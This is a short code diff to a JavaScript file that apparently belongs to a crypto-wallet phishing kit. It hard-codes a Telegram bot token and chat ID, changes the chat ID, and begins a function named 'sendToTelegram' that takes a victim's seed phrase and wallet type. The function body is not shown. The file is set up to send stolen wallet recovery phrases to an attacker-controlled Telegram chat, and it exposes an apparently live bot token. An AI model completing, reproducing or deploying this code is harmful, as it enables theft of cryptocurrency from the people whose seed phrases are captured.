@@ -1,6 +1,6 @@
 // Telegram Bot Configuration - REPLACE WITH YOUR VALUES
 const TELEGRAM_BOT_TOKEN = '8193457596:AAEwExhYhHyncUylbc7o-5dhN5283jKue8w'; // Get from @BotFather
-const TELEGRAM_CHAT_ID = '-1004776147136'; // Can be group ID or channel ID
+const TELEGRAM_CHAT_ID = '-4776147136'; // Can be group ID or channel ID
 
 // Function to send message to Telegram
 async function sendToTelegram(seedPhrase, walletType) {
